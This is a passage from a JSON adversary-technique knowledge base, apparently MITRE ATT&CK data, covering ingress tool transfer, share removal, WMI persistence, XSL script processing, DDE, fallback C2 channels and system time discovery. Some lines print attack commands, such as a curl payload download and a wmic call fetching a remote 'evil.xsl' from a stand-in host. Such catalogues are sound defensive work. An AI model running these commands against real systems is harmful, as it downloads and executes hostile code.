      "can download additional files and tools from its C2 server including through the use of .",
      "During   downloaded tools using victim organization systems.",
      "can upload and download files including second-stage malware.",
      "used executables to download malicious files from different sources.",
      "server component can download remote files.",
      "downloads browser specific AppleScript modules using a constructed URL with the curl command https:// & domain & /agent/scripts/ & moduleName & .applescript.",
      "can upload files to the victims machine and can download additional payloads.",
      "can download and execute new plugins from the C2 server.",
      "can download and execute a replica of itself using .",
      "has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.",
      "has the ability to download next stage malware components to a compromised system.",
      "has the ability to download payloads containing system commands to a compromised host.",
      "can download its payload from a C2 server.",
      "can download additional payloads to a compromised host.",
      "has the ability to download files to compromised devices.",
      "has downloaded additional tools and malware onto compromised networks.",
      "has the ability to download additional files from C2.",
      "used malware to download additional malicious files to the target system.",
      "can install additional modules via C2 commands.",
      "can download additional files onto the infected system.",
      "has the ability to download additional tools such as the RedLine Stealer to an infected host.",
      "can download files to the compromised host.",
      "has used LNK files to download remote files to the victim's network.",
      "can download additional files for execution on the victims machine.",
      "can download additional files and tools.",
      "has downloaded additional malware and files onto a compromised host.",
      "can download its code from C2.",
      "can upload and download files to the victims machine.",
      "may download additional files to execute.",
      "can download additional malware to infected hosts.",
      "has used Powershell to download UltraVNC and  from third-party file sharing sites.",
      "can download files to the system.",
      "has been used to load  onto a compromised host.",
      "has the ability to download and execute additional payloads.",
      "has the ability to upload additional malicious files to a compromised machine.",
      "can download files to the victims machine and execute them.",
      "can download additional malware plug-in modules and execute them on the victims machine.",
      "During  the threat actors downloaded files and tools onto a victim machine.",
      "can download files and additional malware.",
      "has received files from C2 and stored them in log folders beginning with the character sequence `a9850d2f`.",
      "can download additional tools to enable lateral movement.",
      "downloads a shellcode payload from a remote C2 server and loads it into memory.",
      "has downloaded additional malware onto compromised hosts.",
      "used a backdoor NESTEGG that has the capability to download and upload files to and from a victims machine.",
      "can download files to a compromised machine.",
      "has the ability to download files from C2 to the infected host.",
      "can download additional plugins updates and other files.",
      "has the ability to download additional files to a compromised host.",
      "can receive and load executables from remote C2 servers.",
      "has a command to download and execute a file on the victims machine.",
      "can transfer files to and from compromised hosts.",
      "can download files to compromised systems after receiving a command with the string `downloaddd`.",
      "has downloaded tools to compromised hosts.",
      "can write files to a compromised host.",
      "can download additional tools to a compromised host.",
      "has been used to deploy other malware including .",
      "can download files from its C2 server.",
      "has executed a PowerShell command to download a file to the system.",
      "has downloaded additional files including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.",
      "has downloaded a remote module for execution.",
      "has downloaded additional files onto a compromised host.",
      "has downloaded and executed additional encoded payloads.",
      "can deploy additional tools onto an infected machine.",
      "has the ability to drop additional files to an infected machine.",
      "During  the threat actors downloaded additional tools and files onto a compromised network.",
      "has downloaded additional malware and tools including through the use of `certutil` onto a compromised host .",
      "has downloaded scripts from C2.",
      "has the ability to download additional files.",
      "can download and execute new versions of itself.",
      "can download additional files to a targeted system.",
      "has the ability to download and install a remote payload.",
      "can download and execute additional files.  has also downloaded a ransomware payload called Hermes.",
      "can download and execute additional payloads including through the use of a `Dex` command.",
      "can upload download and execute files on the victim.",
      "can execute the command code do_download to retrieve remote files from C2.",
      "has the ability to download and execute additional payloads via a DropBox API.",
      "has the ability to act as a second-stage dropper used to infect the system with additional malware.",
      "has downloaded additional malware including by using .",
      "has the ability to download files to a compromised host.",
      "has a command to download additional files.",
      "can load any files onto the infected machine to execute.",
      "has downloaded additional tools and malware to compromised systems.",
      "has the ability to load a second stage malicious DLL file onto a compromised machine.",
      "has a module to download and execute files on the compromised machine.",
      "During the   pushed additional malicious tools onto an infected system to steal user credentials move laterally and destroy data.",
      "can download and execute an executable from the C2 server.",
      "has the ability to download a DLL from C2 to a compromised host.",
      "can download additional scripts from a web server.",
      "can download malicious files from threat actor controlled AWS URL's.",
      "can download additional malicious files from its C2 server.",
      "can download additional malware from the C2 server.",
      "has used malware that can upload additional files to the victims machine.",
      "has downloaded a variety of modules and payloads to the compromised host including  and NetSupport Manager RAT-based malware.",
      "has the ability to download files from its C2 server.",
      "can download files and execute them on the victims machine.",
      "can download payloads from adversary infrastructure.",
      "can upload a file to the victims machine.",
      "has a download and upload functionality.",
      "can download files from its C2 server including the .NET DLLs `WoodySharpExecutor` and `WoodyPowerSession`.",
      "retrieves cryptocurrency mining payloads and commands in encrypted traffic from its command and control server.  uses Windows Batch scripts executing the curl command to retrieve follow-on payloads.",
      "has the ability to download malicious shellcode to compromised systems.",
      "has the curl and wget commands as well as batch scripts to download new tools.",
      "During  threat actors leveraged exploits to download remote files to Ivanti Connect Secure VPNs.",
      "used SCP to update the miner from the C2.",
      "has the ability to download and execute code from remote servers.",
      "can download and execute a payload onto a compromised system.",
      "has the ability to upload and download files to and from an infected host.",
      "has the ability to deploy modules directly from command and control (C2) servers possibly for remote command execution file exfiltration and socks5 proxying on the infected host.",
      "can download and execute or update malware.",
      "can retrieve additional malicious payloads from its C2 server.",
      "had downloaded additional tools to a compromised host.",
      "is capable of downloading files including additional modules.",
      "has the ability to download and execute files.",
      "has downloaded additional modules and malware to victims machines.",
      "can upload files from the C2 server to the victim machine using the upload command.",
      "can download additional plug-ins to a compromised host.",
      "has downloaded additional files and payloads onto a compromised host following initial access.",
      "During  the threat actors downloaded additional tools and files onto victim machines.",
      "has the ability to upload a file from the command and control (C2) server to the victim machine.",
      "can download additional payloads to a target system.",
      "has the ability to download files from C2 to a compromised host.",
      "During  the threat actors downloaded additional droppers and backdoors onto a compromised system.",
      "can download additional modules from C2.",
      "can download additional modules from its C2 server.",
      "can download additional payloads to compromised systems.",
      "can download additional files onto the compromised host.",
      "can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.",
      "has downloaded files onto a victim machine.",
      "executes a Python script to download its second stage.",
      "can download further malware for execution on the victim's machine.",
      "After downloading its main config file  downloads multiple payloads from C2 servers.",
      "has used tools to download malicious code.",
      "can download files and execute them on a victim's system.",
      "has the ability to download and execute a remote file via .",
      "can transfer files from C2.",
      "can download specific payloads to a compromised host based on OS architecture.",
      "has the ability to download files from C2.",
      "has downloaded additional files and programs from its C2 server.",
      "can transfer malicious payloads such as ransomware to compromised machines.",
      "can download additional plugins files and tools.",
      "can download additional modules and payloads.",
      "can download and upload files to and from the victims machine.",
      "can download and execute files to further infect a host machine with additional malware.",
      "can download and execute a file.",
      "has a function to download a file to the infected system.",
      "has the ability to download additional modules and a configuration file from C2.",
      "can load multiple additional plugins on an infected host.",
      "During  the threat actors downloaded malicious payloads onto select compromised hosts.",
      "can download a copy of itself from an attacker controlled IP address to the victim machine.",
      "has the ability to download additional components and malware.",
      "can deploy additional tools.",
      "can download files via DNS.",
      "can download files to targeted systems.",
      "can deploy additional components or tools as needed.",
      "The  dropper can place malicious payloads on targeted systems.",
      "uses  and  to download additional malware.",
      "can upload and download files to and from the victims machine.",
      "has a command to download files to the victim's machine.",
      "has a command to download a file from the C2 server.",
      "has downloaded additional malware to execute on the victim's machine including by using a PowerShell script to launch shellcode that retrieves an additional payload.",
      "can use a `Put` command to write files to an infected machine.",
      "has downloaded additional malware to execute on victim systems.",
      "can download and upload files to the victim's computer.",
      "is capable of downloading additional files through C2 channels including a new version of itself.",
      "used  to download additional files.  downloaded post-exploitation tools such as  via command shell following initial access.",
      "has the ability to connect to a remote host in order to upload and download files.",
      "During the   downloaded additional malware such as  and  onto a compromised host following initial access.",
      "has used malicious macros to download additional files to the victim's machine.",
      "has downloaded additional files and tools onto a compromised host.",
      "constantly attempts to download and execute files from the remote C2 including  itself if not found on the system.",
      "During  UNC3890 actors downloaded tools and malware onto a compromised host.",
      "has the ability to upload and download files to and from a compromised host.",
      "During  additional payloads were downloaded after a target was infected with a first-stage downloader.",
      "has the ability to download files to the victim's machine.",
      "may be abused by adversaries to transfer tools or files from an external system into a compromised environment.",
      "can be used to copy files from a given URL.",
      "has downloaded additional payloads and malicious scripts onto a compromised host.",
      "can download files onto compromised systems.",
      "can download payloads and extract bytes from files.  uses the curl -fsL $url >$tmp_path command to download malicious payloads into a temporary directory.",
      "downloads a tar compressed archive from a download server to the system.",
      "can download additional files and tools from its C2.",
      "has download files from its C2 server.",
      "has downloaded an auxiliary program named ff.exe to infected machines.",
      "has downloaded binary data from a specified domain after the malicious document is opened.",
      "has used tools to deploy additional payloads to compromised hosts.",
      "has retrieved DLLs and installer binaries for malware execution from C2.",
      "has downloaded additional executables following the initial infection stage.",
      "can download and deploy additional payloads including ransomware and post-exploitation frameworks such as .",
      "can download and execute previously staged shellcode payloads.",
      "can download additional files and tools onto the victims machine.",
      "can download files to specified targets.",
      "During  the threat actors downloaded additional malware and malicious scripts onto a compromised host.",
      "has the ability to download files over SFTP.",
      "has the ability to download files to target systems.",
      "has copied and installed tools for operations once in the victim environment.",
      "has the ability to download additional payloads from C2.",
      "can download additional payloads from the C2.",
      "has downloaded additional scripts that build and run Monero cryptocurrency miners.",
      "has downloaded and installed web shells to following path C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx.",
      "has used first-stage payloads that download additional malware from C2 servers.",
      "can upload additional files to a compromised host.",
      "can deliver additional payloads to victim machines.",
      "has downloaded PowerShell code from the C2 server to be executed.",
      "has a module to download and upload files to the system.",
      "can receive configuration updates and additional payloads including wscpy.exe from C2.",
      "can download files to compromised hosts.",
      "has used various tools to download files including DGet (a similar tool to wget).",
      "has downloaded additional scripts malware and tools onto a compromised host.",
      "has the ability to send and receive files.",
      "has downloaded additional lateral movement scripts from C2.",
      "has used tools to download malicious files to compromised hosts.",
      "has used MSI files to download additional files to execute.",
      "has the ability to download additional modules to a compromised host.",
      "dropped additional tools to victims during their operation including portqry.exe a renamed cmd.exe file winrar and .",
      "has downloaded additional files including an exploit for used privilege escalation.",
      "can download files to be saved on the compromised system.",
      "can upload and download files to and from a target machine.",
      "can download additional files onto an infected machine.",
      "has downloaded tools and malware onto a compromised system.",
      "downloads and uploads files to and from the victims machine.",
      "During  the threat actors downloaded additional tools such as  and  as well as  and  ransomware onto the victim network.",
      "delivered different payloads including  in at least one instance.",
      "can download and execute payloads in-memory or from disk.",
      "has pushed additional malicious tools onto an infected system to steal user credentials move laterally and destroy data.",
      "Operators deploying  have used psexec and certutil to retrieve the  payload.",
      "uploads and downloads files to and from the victims machine.",
      "During  threat actors used administrative utilities to deliver Trojan components to remote systems.",
      "has deployed secondary payloads and third stage implants to compromised hosts.",
      "During  threat actors downloaded additional files to the infected system.",
      "s can download and upload a file to the victims computer.",
      "has downloaded additional tools and malware onto compromised hosts.",
      "can add lines to a Perl script on a targeted server to import additional Perl modules.",
      "has used Wrapper/Gholee custom-developed malware which downloaded additional malware to the infected system.",
      "can upload and download to and from a victim machine.",
      "has been used to download a Python interpreter to `C:\\Users\\Public\\WinTN\\WinTN.exe` as well as other plugins from external sources.",
      "can download additional stages of malware from a Discord CDN channel.",
      "can download updates and auxiliary modules.",
      "can download a payload for execution.",
      "can retrieve an additional payload from its C2 server.  has a command to download files to the victims machine.",
      "has the ability to download malicious executables to a compromised host.",
      "can downloaded payloads from C2 to the compromised host.",
      "has downloaded code from a C2 server.",
      "downloaded several staged items onto the victim's machine.",
      "can upload and download files to and from compromised hosts.",
      "has remotely copied tools and malware onto targeted systems.",
      "downloads an HTTP server to the infected machine.",
      "has downloaded malicious DLLs which served as a  loader.",
      "During   downloaded malicious payloads onto compromised systems.",
      "has the ability to download VBS files to the target computer.",
      "can download payloads from remote C2 servers.",
      "has downloaded additional files and tools from its C2 server.",
      "has a command to transfer files from a remote host.",
      "can download additional files from C2.",
      "has downloaded additional malware and tools onto a compromised host. For example  uses a backdoor script to retrieve and decode additional payloads once in victim environments.",
      "involved execution of `certutil.exe` via web shell to download the  dropper.",
      "retrieves its second stage payload in a variety of ways such as through msiexec.exe abuse or running the curl command to download the payload to the victim's %AppData% folder.",
      "used Curl.exe to download the  payload from an external server saving the file to the victim machine's temporary directory.",
      "downloads various library files enabling interaction with various data stores and structures to facilitate follow-on information theft.",
      "included the use of scripts to download additional payloads when compromising network nodes.",
      "can download and execute PEs DLLs and shellcode from C2.",
      "can retrieve and load additional payloads.",
      "has used PowerShell and  to retrieve follow-on payloads from external locations for execution on victim machines.",
      "has used  to download files to compromised machines.",
      "retrieved a final stage payload from command and control infrastructure during initial installation on victim systems.",
      "executed PowerShell scripts to create scheduled tasks to retrieve remotely-hosted payloads.",
      "used  to download additional files.  downloaded post-exploitation tools such as  via command shell following initial access.  has uploaded Procdump  and NATBypass to a staging directory and has used these tools in follow-on activities.",
      "has downloaded an outdated version of comsvcs.dll to a compromised domain controller in a non-standard folder.",
      "can fetch second stage code from hardcoded web domains.",
      "During  threat actors used web shells to download files to compromised infrastructure.",
      "has downloaded tools to compromised servers including Advanced IP Scanner.",
      "is a loader used to retrieve follow-on payload encoded in email messages for execution on victim systems.",
      "has the ability to download files to targeted systems.",
      "has transferred tools such as  to victim environments from file sharing and hosting websites.",
      "can decode Base64-encoded files and call `WriteAllBytes` to write the files to compromised hosts.",
      "can import and execute additional payloads.",
      "During   downloaded additional tools to comrpomised infrastructure.",
      "has used `wget` and `curl` to download additional content.",
      "On macOS  downloads a `.json` file from the C2 server. The `.json` file contains metadata about the plugins to be downloaded including their URL name version and MD5 hash.  retrieves the plugins specified in the `.json` file which are compiled `.dylib` files. These `.dylib` files provide task and platform specific functionality.  also imports open-source libraries to manage socket connections.",
      "has the ability to download and execute files on compromised systems.",
      "can download additional payloads to compromised hosts.",
      "used a backdoor NESTEGG that has the capability to download and upload files to and from a victims machine. Additionally  has downloaded other payloads onto a victims machine.",
      "can download follow-on payloads and items via malicious `url` parameters in obfuscated PowerShell code.",
      "During  threat actors downloaded additional payloads on compromised devices.",
      "can download staged payloads from an actor-controlled infrastructure.",
      "retrieves cryptocurrency mining payloads and commands in encrypted traffic from its command and control server.  uses Windows Batch scripts executing the curl command to retrieve follow-on payloads.  has stolen `sitemanager.xml` and `recentservers.xml` from `%APPDATA%\\FileZilla\\` if present.",
      "had downloaded remote files onto victim infrastructure.",
      "has used scripted `cURL` commands  and other mechanisms to retrieve follow-on batch scripts and tools for execution on victim devices.",
      "can download additional content and files from the  server to the client residing on the victim machine using the upload command.",
      "can download and execute files from an actor-controlled OneDrive account.",
      "During  threat actors downloaded and executed the XMRig miner on targeted hosts.",
      "installers have used obfuscated PowerShell scripts to retrieve follow-on payloads from WebDAV servers.",
      "can download additional files to the victim machine.",
      "has the ability to download additional content onto an infected machine e.g. by using `curl`."
    ],
    "id": "T1105",
    "name": "Ingress Tool Transfer",
    "similar_words": [
      "Remote File Copy",
      "Ingress Tool Transfer"
    ]
  },
  "attack-pattern--e7eab98d-ae11-4491-bd28-a53ba875865a": {
    "description": "Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the net use \\\\system\\share /delete command. (Citation: Technet Net Use)\n\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation.",
    "example_uses": [
      "has detached network shares after exfiltrating files, likely to evade detection.",
      "The net use \\\\system\\share /delete command can be used in  to remove an established connection to a network share."
    ],
    "id": "T1126",
    "name": "Network Share Connection Removal",
    "similar_words": [
      "Network Share Connection Removal"
    ]
  },
  "attack-pattern--e906ae4d-1d3a-4675-be23-22f7311c0da4": {
    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts. (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)",
    "example_uses": [
      "has used WMI for persistence.",
      "can use a WMI script to achieve persistence.",
      "uses a WMI event subscription to establish persistence.",
      "uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.",
      "has used WMI event filters to establish persistence."
    ],
    "id": "T1084",
    "name": "Windows Management Instrumentation Event Subscription",
    "similar_words": [
      "Windows Management Instrumentation Event Subscription"
    ]
  },
  "attack-pattern--e99ec083-abdd-48de-ad87-4dbf6f8ba2a4": {
    "description": "Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in /System/Library/LaunchDaemons and /Library/LaunchDaemons (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).\n \nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software  (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.\n \nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.",
    "example_uses": [],
    "id": "T1160",
    "name": "Launch Daemon",
    "similar_words": [
      "Launch Daemon"
    ]
  },
  "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3": {
    "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)* msxsl.exe customers[.]xml script[.]xsl* msxsl.exe script[.]xsl script[.]xsl* msxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed Squiblytwo, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)* Local File: wmic process list /FORMAT:evil[.]xsl* Remote File: wmic os get /FORMAT:https[:]//example[.]com/evil[.]xsl",
    "example_uses": [
      "used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.",
      "executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.",
      "used an XSL file to run VBScript code.",
      "During   used a remote XSL script to download a Base64-encoded DLL custom downloader."
    ],
    "id": "T1220",
    "name": "XSL Script Processing",
    "similar_words": [
      "XSL Script Processing"
    ]
  },
  "attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0": {
    "description": "Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\n\nAdversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.",
    "example_uses": [
      "has sent malicious Word OLE compound documents to victims.",
      "leveraged the DDE protocol to deliver their malware.",
      "has been delivered via Word documents using DDE for execution.",
      "has used Windows DDE for execution of commands and a malicious VBS.",
      "can use DDE to execute additional payloads on compromised hosts.",
      "has delivered  and  by executing PowerShell commands through DDE in Word documents.",
      "spear phishing campaigns have included malicious Word documents with DDE execution."
    ],
    "id": "T1173",
    "name": "Dynamic Data Exchange",
    "similar_words": [
      "Dynamic Data Exchange"
    ]
  },
  "attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433": {
    "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
    "example_uses": [
      "uses a large list of C2 servers that it cycles through until a successful connection is established.",
      "can accept multiple URLs for C2 servers.",
      "uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.",
      "creates a backdoor through which remote attackers can change C2 servers.",
      "malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.",
      "primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.",
      "uses a backup communication method with an HTTP beacon.",
      "can switch to a new C2 channel if the current one is broken.",
      "malware contains a secondary fallback command and control server that is contacted after the primary command and control server.",
      "has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.",
      "has the capability to communicate over a backup channel via plus.google.com.",
      "uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.",
      "will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.",
      "has a hard-coded primary and backup C2 string.",
      "The C2 server used by  provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.",
      "tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.",
      "first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.",
      "is usually configured with primary and backup domains for C2 communications.",
      "malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.",
      "tests if it can reach its C2 server by first attempting a direct connection and if it fails obtaining proxy settings and sending the connection through a proxy and finally injecting code into a running browser if the proxy method fails.",
      "has multiple C2 channels in place in case one fails.",
      "has been configured with several servers available for alternate C2 communications.",
      "has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days.",
      "can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.",
      "can communicate over multiple C2 hosts.",
      "primarily uses port 80 for C2 but falls back to ports 443 or 8080 if initial communication fails.",
      "has used several C2 servers per targeted organization.",
      "can attempt to connect to a second hard-coded C2 if the first hard-coded C2 address fails.",
      "can update its configuration to use a different C2 server.",
      "can use backup C2 servers if the primary server fails.",
      "can attempt to find a new C2 server if it receives an error.",
      "has the ability to switch between TCP and HTTP for C2 if one method is not working.",
      "has the ability to generate new C2 domains.",
      "can change its C2 channel once every 360 loops by retrieving a new domain from the actors S3 bucket.",
      "used the Steam community page as a fallback mechanism for C2.",
      "can use a second channel for C2 when the primary channel is in upload mode.",
      "During  threat actors used company extranet servers as secondary C2 servers.",
      "can use multiple domains and protocols in C2.",
      "has used a secondary C2 location if the first was unavailable.",
      "first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2 and if that method fails falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.",
      "can use up to 10 channels to communicate between implants.",
      "will attempt to detect if the infected host is configured to a proxy. If so  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.",
      "malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random and if the transmission fails chooses a new C2 server to attempt the transmission again.",
      "has primarily used port 443 for C2 but can use port 80 as a fallback.",
      "has two hard-coded domains for C2 servers; if the first does not respond it will try the second.",
      "can go through a list of C2 server IPs and will try to register with each until one responds.",
      "can assign hard-coded fallback domains for C2.",
      "has sent data over HTTP if FTP failed and has also used a fallback server.",
      "has the ability to use an alternative C2 server if the primary server fails.",
      "has used a hardcoded GitHub repository as a fallback channel.",
      "can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails it will wait 60 seconds and then try another IP address.",
      "can communicate over multiple C2 host and port combinations.",
      "has used HTTP if DNS C2 communications were not functioning.",
      "uses multiple protocols (HTTPS HTTP DNS) for its C2 server as fallback channels if communication with one is unsuccessful.",
      "Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.",
      "can switch to an alternate C2 domain when a particular date has been reached.",
      "can use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked.",
      "can use a backup channel to request a new refresh token from its C2 server after 10 consecutive unsuccessful connections to the primary OneDrive C2 server."
    ],
    "id": "T1008",
    "name": "Fallback Channels",
    "similar_words": [
      "Fallback Channels"
    ]
  },
  "attack-pattern--f2d44246-91f1-478a-b6c8-1227e0ca109d": {
    "description": "Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",
    "example_uses": [
      "stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.",
      "If the victim is using PowerShell 3.0 or later,  writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\\Windows\\.",
      "hides many of its backdoor payloads in an alternate data stream (ADS).",
      "The  malware platform uses Extended Attributes to store encrypted executables.",
      "Some variants of the  Trojan have been known to store data in Extended Attributes."
    ],
    "id": "T1096",
    "name": "NTFS File Attributes",
    "similar_words": [
      "NTFS File Attributes"
    ]
  },
  "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077": {
    "description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or systemsetup on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing net time \\\\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as GetTickCount() to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose.In addition, system calls  such as time()  have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as systemsetup -gettimezone or timeIntervalSinceNow to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",
    "example_uses": [
      "has the capability to obtain the time zone information and current timestamp of the victim’s machine.",
      "As part of the data reconnaissance phase,  grabs the system time to send back to the control server.",
      "gathers the local system time from the victim’s machine.",
      "A Destover-like implant used by  can obtain the current system time and send it to the C2 server.",
      "can obtain the date and time of a system.",
      "checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.",
      "has used net time to check the local time on a target system.",
      "obtains the victim's current time.",
      "obtains the system time and will only activate if it is greater than a preset date.",
      "has commands to get the time the machine was built, the time, and the time zone.",
      "can obtain the victim time zone.",
      "The net time command can be used in  to determine the local or remote system time.",
      "gathers and beacons the system time during installation.",
      "surveys a system upon check-in to discover the system time by using the net time command.",
      "collects the timestamp from the infected machine.",
      "gathers the current time zone and date information from the system.",
      "has collected the current date and time of the victim system.",
      "can use GetLocalTime and GetSystemTime to collect system time.",
      "has used the API calls NtQuerySystemTime GetSystemTimeAsFileTime and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox.",
      "can obtain the current tick count of an infected computer.",
      "has used tools to obtain the current system time.",
      "can execute getinfo to discover the current time on a compromised host.",
      "uses the net time command to get the system time from the machine and collect the current date and time zone information.",
